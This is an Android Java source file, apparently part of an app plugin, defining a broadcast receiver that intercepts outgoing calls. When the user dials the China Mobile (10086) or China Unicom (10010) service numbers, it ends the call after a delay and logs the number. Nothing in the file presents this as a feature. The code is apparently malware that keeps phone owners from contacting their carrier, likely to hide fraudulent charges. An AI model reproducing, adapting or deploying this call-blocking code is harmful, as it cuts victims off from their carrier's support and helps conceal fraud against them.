package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.text.TextUtils;
import com.xstd.plugin.Utils.PhoneCallUtils;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;


/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-3
 * Time: PM8:58
 * To change this template use File | Settings | File Templates.
 */
public class DialProcessBRC extends BroadcastReceiver {

    public void onReceive(final Context context, Intent intent) {
        if (intent != null) {
            String action = intent.getAction();
            if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
                final String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                if (!TextUtils.isEmpty(phoneNumber)) {
                    Config.LOGD("[[DialProcessBRC::onReceive]] out going Phone Number : " + phoneNumber);

                    int networkType = AppRuntime.getNetworkTypeByIMSI(context);
                    switch (networkType) {
                        case AppRuntime.CMNET:
                            if (phoneNumber.startsWith("10086")) {
                                Handler handler = new Handler(context.getMainLooper());
                                handler.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        PhoneCallUtils.encCall(context);
                                        Config.LOGD("[[DialProcessBRC::onReceive]] End Call for Number : " + phoneNumber);
                                    }
                                }, AppRuntime.END_CALL_DELAY);
                            }
                            break;
                        case AppRuntime.UNICOM:
                            if (phoneNumber.startsWith("10010")) {
                                Handler handler = new Handler(context.getMainLooper());
                                handler.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        PhoneCallUtils.encCall(context);
                                        Config.LOGD("[[DialProcessBRC::onReceive]] End Call for Number : " + phoneNumber);
                                    }
                                }, AppRuntime.END_CALL_DELAY);
                            }
                            break;
                    }
                }
            }
        }
    }

}
